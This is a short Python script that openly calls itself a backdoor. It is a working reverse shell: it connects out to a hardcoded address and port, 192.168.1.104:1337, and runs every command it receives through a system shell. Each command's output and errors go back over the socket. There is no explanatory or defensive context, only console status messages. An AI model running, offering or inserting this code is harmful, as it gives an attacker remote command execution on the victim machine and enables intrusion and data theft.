#!/usr/bin/env python3
import socket
import subprocess
from colorama import Fore, Back, Style
def con_client(rhost,rport):
    get= socket.socket()
    print(f'{Fore.RED}[#]{Fore.WHITE} Initiating Backdoor')
    get.connect((rhost, rport))
    print(f'{Fore.GREEN}[|*|]{Fore.WHITE} Connected')
    while True:
        exec = get.recv(1024)
        exec = exec.decode()
        resp = subprocess.Popen(exec, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        response = resp.stdout.read()
        null_resp = resp.stderr.read()
        get.send(response + null_resp)

con_client('192.168.1.104',1337)
